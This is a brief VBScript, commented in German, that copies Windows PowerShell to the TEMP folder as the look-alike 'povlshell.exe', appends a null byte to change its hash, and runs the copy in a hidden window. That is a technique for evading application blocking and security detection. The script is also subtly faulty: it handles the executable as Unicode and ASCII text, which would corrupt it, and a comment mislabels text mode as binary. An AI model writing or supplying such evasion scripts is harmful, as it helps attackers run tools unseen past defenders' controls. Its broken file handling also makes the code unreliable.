Option Explicit

Dim fso, bin, binNew, sourceFile, destFile, tempFolder
Dim byteData, newByteData, fileStream
Dim objShell

' Original-Pfad der Datei
sourceFile = "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe"

' Zielpfad im TEMP-Verzeichnis
Set objShell = CreateObject("WScript.Shell")
tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
destFile = tempFolder & "\povlshell.exe"

' Datei öffnen und als Binärdaten lesen
Set fso = CreateObject("Scripting.FileSystemObject")
If Not fso.FileExists(sourceFile) Then
    WScript.Echo "Fehler: Quelldatei existiert nicht."
    WScript.Quit
End If

' Datei als Binärdaten laden
Set fileStream = fso.OpenTextFile(sourceFile, 1, False, -1) ' -1 = Unicode-Modus (Binary)
byteData = fileStream.ReadAll
fileStream.Close
Set fileStream = Nothing

' Null-Byte hinzufügen
newByteData = byteData & Chr(0)

' Neue Datei schreiben
Set binNew = fso.CreateTextFile(destFile, True, False)
binNew.Write newByteData
binNew.Close
Set binNew = Nothing

' Datei ausführen
objShell.Run Chr(34) & destFile & Chr(34), 0, False

' Aufräumen
Set objShell = Nothing
Set fso = Nothing
